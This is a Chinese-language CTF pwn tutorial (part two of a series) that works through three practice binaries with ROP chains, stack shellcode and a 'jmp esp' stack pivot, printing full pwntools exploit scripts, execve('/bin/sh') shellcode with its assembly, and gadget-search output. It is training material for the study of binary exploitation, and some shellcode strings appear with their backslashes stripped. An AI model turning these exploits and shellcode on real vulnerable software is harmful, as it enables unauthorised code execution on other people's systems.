# Linux pwn从入门到熟练（二）

阅读量 **457552**

|评论 **13**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-12-24 14:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01749be58aa4e9bc9d.gif)

## 前言

上回说到，如何利用程序中system函数以及bin/sh字符串来进行pwn。这里我们会介绍，如何在栈可执行而system函数以及参数没有的情况下，如何自己布置payload进行pwn。此外，还提供了一份可以参考的pwn套路，套路熟悉了，即可慢慢转化为熟悉。故此名曰：入门到熟练（二）。

## 练习题参考（利用库函数读取参数）

所谓的入门到熟练，套路还是要有的。套路有了，就可以见招拆招。我们一步一步来。

拿到题，我们需要依次查看：

  1. 检查保护情况
  2. 判断漏洞函数，如gets,scanf等
  3. 计算目标变量的在堆栈中距离ebp的偏移
  4. 分析是否已经载入了可以利用的函数，如system，execve等
  5. 分析是否有字符串/bin/sh

[Pwn4](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop/pwn4)题目地址。

###  第一步，保护情况，

发现堆栈不可以执行，其他到还好。那么，我们在溢出时就需要再堆栈中部署的具有功能的地址，而不是具体的代码了。理解成堆栈中需要布置路线图，之后的程序按照这个路线图来执行。

反之，如果堆栈可以执行，我们就要思考如何布置shellcode，如何优化shellcode长度以及删除坏字符。（将在下一题的时候介绍）

![](https://p0.ssl.qhimg.com/t01f8b5bc18e39f93c7.png)

###  第二步，检测漏洞函数。

发现是gets。这里分享一个ctf-pwn-tips，里面总结了很多的存在漏洞的函数，以及输入参数的描述，非常实用。[TIPS](https://github.com/Naetw/CTF-pwn-tips)

![](https://p1.ssl.qhimg.com/t014d94fc90e8ce8cea.png)

###  第三步，确认偏移量。

有几种方式。

![](https://p0.ssl.qhimg.com/t0167c02bcc6dbf90e6.png)

我们可以直接从IDA的代码中分析出来，参数距离EBP的位置。如上述，看到距离ebp是0x64（100）个的字节，那么距离存放返回地址的偏移就是100+4=104个字节。但是，IDA的分析并不都是准确的，真正准确的位置，还是需要我们手动去调试。具体方法参考[Linux
PWN从入门到熟练](https://www.anquanke.com/post/id/164530)。这里简单整理一下步骤（假设linux程序在虚拟机guest执行，IDA在主机host执行）：

  1. 拷贝linux_server到guest的程序目录，并执行；
  2. IDA设置远程调试，并设置正确的guest IP和端口；
  3. IDA设置程序的断点在return，可以方便查看寄存器；
  4. 运行程序；
  5. 用脚本patternLocOffset.py创建偏移测试字符串，700字节度比如；
  6. 将产生的字符串在guest中输入；
  7. 查看host中IDA的ebp字符串；
  8. 在patternLocOffset.py中计算偏移

最终应该可以看到下面类似的结果。

![](https://p4.ssl.qhimg.com/t017968c196596776d0.png)

    
    
    $ python patternLocOffset.py -l 700 -s 0x41366441
    [*] Create pattern string contains 700 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 108 (adjusted another-endian)
    [+] take time: 0.0004 s
    

发现实际的偏移是108个字节，覆盖点距离ebp。那么距离返回地址就应该是108+4=112字节。可见，IDA的分析有时是不准的，需要自己去测量。

###  第四步，分析可以利用的函数，

发现有system的：

![](https://p4.ssl.qhimg.com/t01288ba56dd36b995f.png)

###  第五步,查找是否有系统调用字符串：

    
    
    ROPgadget --binary ret2libc2 --string "/bin/sh"
    Strings information
    ============================================================
    

发现并没有字符串了，因此这里我们需要想个办法。

直观的想法是在shellcode中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样：

    
    
    payload = flat(['a' * 112, system_plt, 0xabcdabcd, “/bin/sh”])
    

但是正如我们前面所说，放在堆栈中的是程序执行的路线图，而不是实际的程序或者字符串，因此，按照上述方式放置字符串，system并不会读取”/bin/sh”，而是读取”/bin/sh”对应的4个字节的地址所指向的内存空间，这个空间明显是不合法，因此就会导致利用失败。

怎么办呢？我们发现程序中还载入了函数gets，那么我们可以利用gets来读取用户输入的”/bin/sh”放置到某个地址空间去，接着system再调用它。“某个地址空间”可以是下面的buf2，可以发现它的地址是0x0804A080。这个空间可以让我们使用（感觉明显是CTF题留出来的位置=
=）

![](https://p5.ssl.qhimg.com/t017a6718f692b766fa.png)

那么，我们的exp可以按照下面的方式安排：

    
    
    ##!/usr/bin/env python
    from pwn import *
    
    sh = process('./pwn4')
    shelf = ELF('./pwn4')
    
    gets_plt = shelf.plt['gets']
    system_plt = shelf.plt['system']
    pop_ebp = 0x0804872f
    buf2 = 0x804a080
    payload = flat(
    ['a' * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
    
    sh.sendline(payload)
    sh.sendline('/bin/sh')
    sh.interactive()
    

其中关键的代码是：

    
    
    payload = flat(
    ['a' * 112, gets_plt, pop_ebp, buf2, system_plt, 0xabcdabcd, buf2])
    

相信有的朋友会不明白，为啥有个[gets_plt, pop_ebp,
buf2]，这样的payload布置。Pop_ebp的主要目的是让eip流向system的位置，并且取出system地址赋值给eip。

Pop_ebp其实不一定是pop
ebp，pop任何其他的寄存器都可以，主要是利用该指令的esp+4的功能。比如，我们可以找到如下的位置，其中0x0804872f，0x0804843d都可以让它esp+4操作一次就好，操作多了就流的多了，就不指向system地址了，注意我们这里还要求得要返回ret一下，这样才会实际的提取system的地址出来，赋值给eip：

    
    
    @ubuntu:~/ $ ROPgadget --binary pwn4 --only 'pop|ret'
    Gadgets information
    ============================================================
    0x0804872f : pop ebp ; ret
    0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    0x0804843d : pop ebx ; ret
    0x0804872e : pop edi ; pop ebp ; ret
    0x0804872d : pop esi ; pop edi ; pop ebp ; ret
    0x08048426 : ret
    0x0804857e : ret 0xeac1
    
    Unique gadgets found: 7
    

未来更清楚一些，画了一个图，其中序号的顺序表示，对应的命令执行完之后，esp对应的位置。

![](https://p1.ssl.qhimg.com/t018a4afb837304a376.png)

## 第一题（堆栈直接执行shellcode）

接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。

[pwn5](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/%20pwn5)

继续前面的套路。

###  第一步，查看保护

![](https://p2.ssl.qhimg.com/t016b308f80ec6901b4.png)

发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。

###  第二步，判断漏洞函数。

![](https://p1.ssl.qhimg.com/t01056910f70d292495.png)

发现函数是read，仅仅读取0x40（64）个字节。

###  第三步，计算目标变量的在堆栈中距离ebp的偏移

![](https://p2.ssl.qhimg.com/t0114aaf4e471689ae0.png)

EBP的内容为：0x3761413661413561

    
    
    $ python patternLocOffset.py -l 700 -s 0x3761413661413561
    [*] Create pattern string contains 700 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 16 (adjusted another-endian)
    [+] take time: 0.0005 s
    

距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。

这里可以发现IDA分析的又是正确的了，0x10个字节。

###  第四步和第五步，分析是否已经载入了可以利用的函数，

如system，execve等

发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。

![](https://p2.ssl.qhimg.com/t01360d2ba3379b64b1.png)

理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：

    
    
    # 23 bytes
    # https://www.exploit-db.com/exploits/36858/
    shellcode_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
    

它的汇编形式是

    
    
    # char *const argv[]
    xorl %esi, %esi
    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'
    movq $0x68732f2f6e69622f, %rbx
    # for 'x00'
    pushq %rsi
    pushq %rbx
    pushq %rsp
    # const char *filename
    popq %rdi
    # __NR_execve 59
    pushq $59
    popq %rax
    # char *const envp[]
    xorl %edx, %edx
    syscall
    

好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。

我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。

处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：

![](https://p1.ssl.qhimg.com/t019698e0c6c9cf851f.png)

![](https://p3.ssl.qhimg.com/t01b62400cb53319c0a.png)

它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）

那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。

    
    
    from pwn import *
    code = ELF('./pwn5')
    
    # 23 bytes
    # https://www.exploit-db.com/exploits/36858/
    shellcode_x64 = "x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05"
    sh.recvuntil('[')
    buf_addr = sh.recvuntil(']', drop=True)
    buf_addr = int(buf_addr, 16)
    payload = 'b' * 24 + p64(buf_addr + 32) + shellcode_x64
    sh.sendline(payload)
    sh.interactive()
    

堆栈的布置图，以及地址的相对位置，以buf为起点。

![](https://p1.ssl.qhimg.com/t01e0f313dd79878e65.png)

## 第二题（控制esp进行精准打击）

接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？

[pwn6](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6)

继续前面的过程：

###  第一步：检测保护情况

![](https://p1.ssl.qhimg.com/t016ededdc1521f063d.png)

发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。

###  第二步，判断漏洞函数，

如gets,scanf等

![](https://p5.ssl.qhimg.com/t01e2b7c1e1f2074dd7.png)

发现是fgets函数，仅仅读取50个字节的字符长度。

###  第三步，

计算目标变量的在堆栈中距离ebp的偏移。

方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。

###  第四步和第五步：

分析是否已经载入了可以利用的函数。发现并没有

![](https://p3.ssl.qhimg.com/t011d3d70f9f4613bf3.png)

    
    
    $ ROPgadget --binary stack_pivoting_1 --string '/bin/sh'
    Strings information
    ============================================================
    

字符串自然也是没有的。

我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！

那么怎么办呢？

既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。

这里，我先放图出来解释一下思路：

![](https://p2.ssl.qhimg.com/t01175d7da88713df4b.png)

我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：

  1. 推算shellcode放置的地址
  2. 跳转到shellcode放置的位置

首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。

对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp
esp这个操作，来让程序流获得在栈上执行的先河。

    
    
    $ ROPgadget --binary stack_pivoting_1 --only 'jmp|ret' | grep 'esp'
    0x08048504 : jmp esp
    

发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。

在这里，我们直接可以选择让pwntools产生可执行的代码”sub esp 0x28; jmp
esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。

最后的EXP按照下面这样布置：

    
    
    from pwn import *
    
    sh = process('./pwn6')
    
    shellcode_x86 = "x31xc9xf7xe1x51x68x2fx2fx73"
    shellcode_x86 += "x68x68x2fx62x69x6ex89xe3xb0"
    shellcode_x86 += "x0bxcdx80"
    
    sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
    jmp_esp = 0x08048504
    payload = shellcode_x86 + (
        0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
    sh.sendline(payload)
    sh.interactive()
    

注意，这里我们又启用了另外一段代码：

它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：

    
    
    shellcode_x86 = "x31xc9”                  # xor    ecx, ecx
    shellcode_x86 += “xf7xe1”            # mul    ecx
    shellcode_x86 += “x51”            # push   ecx
    shellcode_x86 += "x68x2fx2fx73x68"  # push 0x68732f2f
    shellcode_x86 += "x68x2fx62x69x6e"  # push 0x6e69622f    
    shellcode_x86 += “x89xe3”            # mov    ebx, esp
    shellcode_x86 += “xb0x0b”            # mov    al, 0xb
    shellcode_x86 += "xcdx80"        # int    0x80
    

## 总结

最后，再次给大家留下练习题。

[pwn7](https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7)

给大家一个小tips，32位和64位程序的调试，一般的处理方式是准备两个虚拟机。但是这样操作太麻烦了，而且pwntools在32位下面经常无法正常工作。怎么办呢？理论上64位ubuntu是可以运行32位程序的，但是需要相关的库函数安装。使用下面的命令安装就好（[参考](https://blog.csdn.net/kingroc/article/details/51143327)）：

    
    
    sudo dpkg --add-architecture i386
    sudo apt-get update
    sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
    

如果是比较老的版本，可以用下面的命令：

    
    
    sudo apt-get install ia32-libs
    

如果大家觉得好，欢迎大家来我的github主页follow:
[desword_github](https://github.com/desword),[desword](https://desword.github.io/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **desword** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168468](/post/id/168468)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [Pwn](/tag/Pwn)
  * [系统安全](/tag/系统安全)

 **+1** __33赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t01f63ac26a9939acbd.jpg) desword

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

